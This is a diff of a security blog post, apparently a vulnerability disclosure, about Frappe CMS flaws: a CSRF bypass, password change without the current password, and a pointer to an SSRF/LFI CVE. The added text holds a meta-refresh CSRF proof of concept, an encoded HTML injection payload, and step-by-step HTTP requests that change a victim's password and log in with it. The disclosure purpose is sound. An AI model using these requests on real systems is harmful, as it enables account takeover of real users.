@@ -179,7 +179,7 @@ The Frappe CMS in some cases handles GET requests in the same way as POST reques
 For example, when calling the `/api/method/frappe.utils.print_format.report_to_pdf` API endpoint, an attacker can use either a `GET` or `POST` request to trigger PDF generation, making it easier to exploit CSRF vulnerabilities.
 
 #### **1.3. Simple CSRF POC**
-When an attacker hosts the following HTML content on their domain `example.com.attacker.com`, they can change the password of a visitor who is logged in to Frappe hosted on `example.com`.
+When an attacker hosts the following HTML content on their domain `example.com.attacker.com`, they can change the password of a visitor who is logged in to Frappe hosted on `example.com` (more details in vulnerability no. 3).
 
 ```html
 <meta http-equiv="refresh" content="0; url=http://example.com/api/method/frappe.desk.page.user_profile.user_profile.update_profile_info?profile_info=%7b%22new_password%22%3a%20%22TestPassword123456%3f%22%7d"/>
@@ -214,17 +214,117 @@ profile_info=%7b%22user_image%22%3a%22http%3a%2f%2f%5c%22%3e%3cimg%20src%3dxyz%2
 This payload is also reflected on `http://localhost:8080/app/home` although it isn't visible to user (the payload is still executed).
 
 ### **3. Password Change**
-An attacker can also change the password of an authenticated user without knowing the current one. This can be achieved by sending the JSON payload `{"new_password":"SuperSecur3P@$$w0rd!"}` to the `profile_info` parameter in the `/api/method/frappe.desk.page.user_profile.user_profile.update_profile_info` endpoint.
+An attacker can also change the password of an authenticated user without knowing the current one. This can be achieved by sending the JSON payload `{"new_password":"0xdeadbeef"}` to the `profile_info` parameter in the `/api/method/frappe.desk.page.user_profile.user_profile.update_profile_info` endpoint.
 
 **Request:**
 ```http
-GET /api/method/frappe.desk.page.user_profile.user_profile.update_profile_info?profile_info=%7b%22new_password%22%3a%20%22TestPassword123456%3f%22%7d HTTP/1.1
+POST /api/method/frappe.desk.page.user_profile.user_profile.update_profile_info HTTP/1.1
 Host: localhost:8080
-Referer: example.com.attacker.com
-Cookie: sid=1612f02626922182dfbe581e3f3961a9c36ef1b14efa7b26f880715a
+Cookie: system_user=no; user_image=; sid=c75135de8c12dbcaa933e6f92901703828da54eb463148587d323767; full_name=test; user_id=test%40test.test
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+
+
+profile_info={"new_password"%3a"0xdeadbeef"}
 ```
 
+**Response:**
+```
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Date: Fri, 16 May 2025 09:11:03 GMT
+Content-Type: application/json
+<SNIP>
+```
+After the request is successfully sent user can log in with new password.
+
+**Request:**
+```http
+POST /login HTTP/1.1
+Host: localhost:8080
+Content-Length: 43
+Content-Type: application/x-www-form-urlencoded
+
+cmd=login&usr=test@test.test&pwd=0xdeadbeef
+```
+
+**Response:**
+```
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Set-Cookie: sid=5fbcd629e3d859ba69acfd8718ae79d6dac5d40b2754dafa7f6e859a; Expires=Fri, 23 May 2025 11:14:03 GMT; Max-Age=612000; HttpOnly; Path=/; SameSite=Lax
+<SNIP>
+```
+
+
 This vulnerability could lead to a complete takeover of the user's account when combined with the CSRF bypass.
+
+To abuse the CSRF bypass one have to first send POST request to change the password and then the password can be also changed by GET requests as follows.
+
+**Request:**
+```
+POST /api/method/frappe.desk.page.user_profile.user_profile.update_profile_info HTTP/1.1
+Host: localhost:8080
+Cookie: sid=a4c9818f005fa628d936b0937e0b8da3486167b11ff1ff9a87767ab7
+Content-Type: application/x-www-form-urlencoded
+X-Frappe-CSRF-Token: 1a387f9fab855dc76392434eb45af7ced7c1fa7541536018b2ecf838
+Content-Length: 44
+
+profile_info={"new_password"%3a"0xdeadbeef"}
+```
+
+**Response:**
+```
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Date: Fri, 16 May 2025 09:28:44 GMT
+Content-Type: application/json
+<SNIP>
+```
+After this first POST request GET requests can also be used to change the password for some reason.
+
+**Request:**
+```
+GET /api/method/frappe.desk.page.user_profile.user_profile.update_profile_info?profile_info={"new_password"%3a"0xdeadbeef123"} HTTP/1.1
+Host: localhost:8080
+Cookie: sid=a4c9818f005fa628d936b0937e0b8da3486167b11ff1ff9a87767ab7
+```
+
+**Response:**
+```
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Date: Fri, 16 May 2025 09:32:12 GMT
+Content-Type: application/json
+Content-Length: 2044
+<SNIP>
+```
+And after the password is changed user can login with the new credentials `0xdeadbeef123`.
+
+**Request:**
+```
+POST /login HTTP/1.1
+Host: localhost:8080
+X-Requested-With: XMLHttpRequest
+Content-Length: 47
+Content-Type: application/x-www-form-urlencoded
+
+cmd=login&usr=test1@test.test&pwd=0xdeadbeef123
+```
+
+**Response:**
+```
+HTTP/1.1 200 OK
+Server: nginx/1.22.1
+Date: Fri, 16 May 2025 09:32:18 GMT
+Content-Type: application/json
+Content-Length: 57
+Connection: keep-alive
+Set-Cookie: sid=aecdcadc69852d2b9874d238b9ae3bb4206f70d27af00b92e8ee9b10; Expires=Fri, 23 May 2025 11:32:18 GMT; Max-Age=612000; HttpOnly; Path=/; SameSite=Lax
+<SNIP>
+```
+
+I found this behavior to be too non-deterministic to be easily exploitable, however I have decided to include it in the blog since it is a problem and the attack vector is not too complex.
 
 ### **4. Exploiting CVE-2025-26240 in Frappe CMS** - Authenticated SSRF / LFI
 As we discussed in our previous blog about the pdfkit vulnerability - CVE-2025-26240 ([blog post](https://habuon.github.io/2025/03/12/pdfkit-vulnerability-(CVE-2025-26240).html)) - an attacker can exploit the `from_string` method to achieve SSRF or LFI. In the Frappe CMS, the attacker must be authenticated to call the `/api/method/frappe.utils.print_format.report_to_pdf` endpoint.
